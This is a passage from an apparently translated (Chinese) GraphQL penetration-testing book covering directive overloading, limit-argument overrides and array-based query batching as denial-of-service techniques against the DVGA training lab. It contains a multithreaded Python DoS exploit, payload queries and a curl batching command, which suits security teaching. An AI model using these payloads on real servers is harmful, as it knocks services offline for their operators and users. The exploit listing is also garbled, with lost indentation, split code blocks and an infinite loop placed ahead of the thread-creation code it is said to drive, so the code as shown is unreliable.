

攻击相当简单：在查询的多个部分中填充指令并将其发送到服务器，如清单 5-10 所示。

```
query {
  pastes {
    title @aa@aa@aa # add as many directives as possible
    content @aa@aa@aa@aa
  }
}
```

清单 5-10：指令过载的示例

对服务器的影响可能因其硬件规格而异。我们在使用这种利用技术时观察到不同的服务器行为，例如 GraphQL 服务器崩溃（由于数据库内存错误）或服务性能下降。

## 测试指令过载

本书 GitHub 仓库中的利用程序 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/exploit_directive_overloading.py 利用了这种类型的漏洞，可以针对 DVGA 执行指令过载攻击。

在运行此脚本的任何时候，都可以通过按 CTRL-C 发送 SIGINT 信号来停止其操作。请注意，在脚本运行期间，DVGA 很可能会变慢或无响应。

以下命令从命令行运行利用程序：

```
# python3 exploit_directive_overloading.py http://localhost:5013/graphql 30000
```

清单 5-11 显示了主要的利用代码。

```
URL = sys.argv[1]
FORCE_MULTIPLIER = int(sys.argv[2])

def start_attack():
    payload = '@dos' * FORCE_MULTIPLIER
    query = {'query': 'query { __typename ' + payload + ' }'}
    try:
        r = requests.post(URL, json=query, verify=False)
        print('\t HTTP Response', r.text)
        print('\t HTTP Code: ', str(r.status_code))
    except:
        pass

threads = []

while True:
    time.sleep(2)
    start = time.time()
    start_attack()
    print(f'\tTime request took: {time.time() - start}')

for i in range(300):
```

```
t = threading.Thread(target=start_attack)
threads.append(t)
t.start()

for t in threads:
    t.join()
```

清单 5-11：滥用指令过载漏洞的利用代码

利用程序从命令行接受两个参数，一个用于标识目标 API，另一个用于在利用期间填充到查询中的指令数量。作为 `start_attack` 函数的一部分，我们将 `dos` 指令乘以提供的指令数量。然后我们构建将使用恶意负载的 GraphQL 查询并创建 300 个线程，每个线程并行运行 `start_attack` 函数。这通过使用无限 `while` 循环使服务器资源在利用运行期间保持繁忙。

NOTE 利用程序中指定的指令不必存在于 GraphQL 中才能工作。你可以指定任意文本并在其前面加上 @ 符号。

## 对象限制覆盖

GraphQL 服务器默认可以实现对返回给客户端的数据量的限制。对于返回数组的字段来说尤其重要。例如，回顾一下，在 DVGA 中，`pastes` 查询返回一个粘贴对象数组：

```
type Query {
  pastes: [PasteObject]!
}
```

感叹号意味着 `pastes` 是非空的，因此数组必须有零个或多个项目。除非查询被明确限制，否则 GraphQL 将返回所有对象作为对 `pastes` 请求的响应。例如，如果数据库有 10,000 个对象，GraphQL 可能会返回全部 10,000 个。

包含 10,000 个对象的响应对于服务器（和客户端）来说是大量数据。服务器可以实现逻辑将返回对象的数量限制为更受限制的数量，例如 100。例如，它们可能会按创建时间对对象进行排序并仅返回最新的粘贴。这种过滤可以在数据库级别、GraphQL 级别或两者同时进行。

一些 GraphQL 应用程序可能允许客户端通过传递诸如 `limit` 之类的特殊参数来覆盖此服务器端对象限制，如此示例所示。继续在 Altair 中运行此查询：

```
query {
  pastes(limit:100000, public: true) {
    content
  }
}
```

执行此查询时，GraphQL 可能在幕后将其转换为 SQL 查询，如下所示：

```
SELECT content FROM pastes WHERE public = true LIMIT 100000
```

在 DVGA 这样的小型数据库上，这不会造成多大危害。然而，在非常大的数据库上，控制服务器返回的行数可能非常强大，并且可能允许我们执行数据库级别的 DoS。

如果启用了 introspection，GraphQL 将在你输入时自动补全参数，使得发现查询支持的参数变得很容易。如果禁用了 introspection，请尝试常见的关键字，例如 `limit`、`offset`、`first`、`after`、`last`、`max` 和 `total`。这些关键字通常与 API 分页相关联，分页是一种控制 HTTP 响应中返回的数据量的方式。分页将大型数据集分成较小的部分，这允许客户端以块的形式请求和接收数据。

值得测试服务器允许客户端请求多少个对象。能够从服务器请求任意数量的记录的能力可能成为应用程序中的另一个 DoS 向量。

## 基于数组的查询批处理

现在我们将探索一个非常方便地允许我们扩展到目前为止所学攻击的功能。查询批处理是用于将多个查询分组并并行发送到 GraphQL API 的任何方法。别名是查询批处理的一种形式。

虽然有用，但别名有一个明显的缺点，即它们只能批处理相同操作根类型的查询。例如，你不能将 mutation 和 query 一起别名。数组批处理技术允许我们混合查询和 mutation。然而，数组不是规范的一部分，因此在所有渗透测试中可能都不可用。

### 了解基于数组的查询批处理的工作原理

基于数组的查询批处理是一种功能，允许客户端在 JSON 负载的一部分中以数组的形式发送多个任何根类型的 GraphQL 查询。假设我们想要多次发送一个查询并多次接收相同的响应。使用基于数组的查询批处理，我们可以通过本质上复制此查询并将副本添加为数组的元素来轻松实现。以下是伪查询示例：

```
[ query { ipAddr title content } query { ipAddr title
```

```
content
}
]
```

当 GraphQL 从客户端接收到查询数组时，它将按顺序处理它们，并在最后一个数组元素被处理和解析之前不返回响应。一旦所有查询都被解析，它将返回一个包含所有查询响应的数组作为单个 HTTP 响应。

你的黑客直觉可能在此时开始发挥作用，因为这里存在明显的风险。假设客户端将发送合理数量的查询到数组中。但如果客户端在单个数组中发送数千个查询会怎样？让我们来看看。剧透：会发生坏事。

与别名一样，识别基于数组的批处理查询的滥用可能很困难，因为安全分析师在日志中看到的只是一个 HTTP 请求。这可能不会立即显现为恶意模式。因此，这种技术可能会绕过传统的速率限制控制，这些控制可能限制客户端每秒请求数（RPS）或每分钟请求数（RPM）。

在本章末尾，我们将讨论应用程序可以实施的一些潜在缓解措施来处理批处理查询。

### 测试基于数组的查询批处理

GraphQL IDEs 如 Altair、GraphQL Playground 和 GraphiQL Explorer 不直接从界面支持基于数组的查询。因此，为了测试 DVGA 是否启用了基于数组的查询批处理，我们需要使用 HTTP 客户端，如 cURL 或脚本语言，如 Python。我们将在实验室中展示如何使用这两种方法。

### 使用 cURL

清单 5-12 中的命令使用 cURL 发送查询数组。

```
# curl http://localhost:5013/graphql -H "Content-Type: application/json" -d '[{"query":"query {systemHealth}"},{"query":"query {systemHealth}"}]'
[
  {"data":{"systemHealth":"System Load: 0.03 \n"}},
  {"data":{"systemHealth":"System Load: 0.03 \n"}}
]
```

清单 5-12：使用 cURL 的基于数组的批处理查询

在此 cURL 命令中，我们使用 `-d` 标志将 GraphQL 查询数组发送到服务器。数组由方括号 [] 定义，围绕两个相似的 GraphQL 查询。在每个查询中，我们使用 `systemHealth` 对象。GraphQL 服务器返回两个单独的响应。

如果 GraphQL 服务器支持发送包含两个 GraphQL 查询的数组将导致相等数量的查询响应

